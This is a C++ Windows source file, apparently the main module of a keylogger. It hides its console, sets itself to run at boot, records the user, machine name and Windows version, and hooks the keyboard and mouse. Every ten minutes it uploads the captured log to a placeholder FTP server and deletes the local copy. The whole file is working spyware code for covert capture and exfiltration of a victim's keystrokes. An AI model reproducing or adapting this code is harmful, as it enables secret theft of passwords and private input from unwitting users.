#include <windows.h>
#include <Lmcons.h>
#include <stdio.h>
#include "../libraries/time_info.h"
#include "../libraries/fileio.h"
#include "../libraries/proc_info.h"
#include "../libraries/window_functions.h"
#include "keycode_constants.h"
#include "keycode_map.h"
#include "keyboard_hook.h"
#include "mouse_hook.h"
#include "../libraries/sys_info.h"
#include "../libraries/FTPObj.h" /** Still needs to work with RAM buffers */
#include "../libraries/autorun.h" /** Re-write as class */

/** Note that the password has been known to fail if it has special characters in it */
#define FTP_USERNAME    "user"
#define FTP_PASSWORD    "password"
#define FTP_SERVER      "ftp.domain.com"
#define FTP_DIRECTORY   "/"

#define IDT_TIMER1          100
#define MUTEXNAME           "MUTEX_NAME"
#define TIMERMSEC           600000 /* 10 minutes */

using namespace std;

HANDLE ghMutex = NULL;


/*#########################################################################################################################

FUNCTION NAME: DWORD WINAPI submitFile(){
AUTHOR: SCOTT MORRIS
CREATION DATE: 1/19/2018 11:40:35 PM
DESCRIPTION: This is a function that is called to spawn off a non-blocking thread that will upload the log to an FTP server.
RECEIVES: NOTHING
RETURNS: NOTHING
PRECONDITIONS: Well, you should probably have defined and included the FTP object in the code.
POSTCONDITIONS: Log has been submitted via FTP.
CODE EXAMPLE:
NOTES:

#########################################################################################################################*/
DWORD WINAPI submitFile(){

    FTPObj mFTP = FTPObj( SAVE_FILENAME, FTP_USERNAME, FTP_PASSWORD, FTP_SERVER, FTP_DIRECTORY );

    if( mFTP.FileSubmit() == 0 ){

        /*Remove the existing log*/
        remove( SAVE_FILENAME );

    }

    return 0;
}

/*#########################################################################################################################

FUNCTION NAME: VOID CALLBACK MyTimerProc
AUTHOR: SCOTT MORRIS
CREATION DATE: 1/12/2018 12:06:47 AM
DESCRIPTION: The callback function for the timer.
RECEIVES:
	HWND - a handle to the window to process the timer message
	UINT - a WM_TIMER message
	UINT - the timer identifier
	DWORD - current system time
RETURNS: NOTHING
PRECONDITIONS: Timer must be initialized and started. Must #include <windows.h>
POSTCONDITIONS: Timer has gone off.
CODE EXAMPLE:
	#define TIMERMSEC           600000
	#define IDT_TIMER1          100
    void somefunction(){
        SetTimer( NULL, IDT_TIMER1, TIMERMSEC, (TIMERPROC) MyTimerProc );
    }
NOTES:

#########################################################################################################################*/
VOID CALLBACK MyTimerProc(

    HWND hwnd,        // handle to window for timer messages
    UINT message,     // WM_TIMER message
    UINT idTimer,     // timer identifier
    DWORD dwTime)     // current system time

{
//    HANDLE hThread;
    DWORD threadID;

    /** Create a thread and post the log. The thread is so it doesn't block input from mouse and keyboard. */
    CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE) submitFile, 0, 0, &threadID );
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nShowCmd)
{
    /*
        Create and set a timer that uploads the log to an FTP server
    */
    SetTimer( NULL, IDT_TIMER1, TIMERMSEC, (TIMERPROC) MyTimerProc );

    /*
        Set the program to run on boot
        Have to do an actual class full of registry functions and do this all correctly
    */
    setAutorun();

    /*
        Make sure this only runs once with a mutex
    */
    ghMutex = CreateMutex(NULL, TRUE, MUTEXNAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        ExitProcess(1);
    }

    secLine();/**< Write out a section line for legibility */
    secLine();/**< Write out a section line for legibility */
    writeTime(); /**< Insert a time stamp so we know when we started */
    getUser(); /**< Grab the user who is currently logged into the machine */
    getCompName();/**< Grab the name of the computer that this is running on */
    getVersionInfo(); /**< Grab the version of windows that we are working with */
    secLine();/**< Write out a section line for legibility */
    secLine(); /**< Write out another section line */

    FreeConsole();

    begMouseHook(hInstance);/**< Hook the mouse so we can gather input from it */
    addKeyboardHook(); /**< Hook the keyboard so we can gather input from it */

    MSG message;
    while(GetMessage(&message,NULL,0,0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    endMouseHook(); /**< Remove the mouse hook */
    rmvKeyboardHook(); /**< Remove the keyboard hook */

    return 0;
}
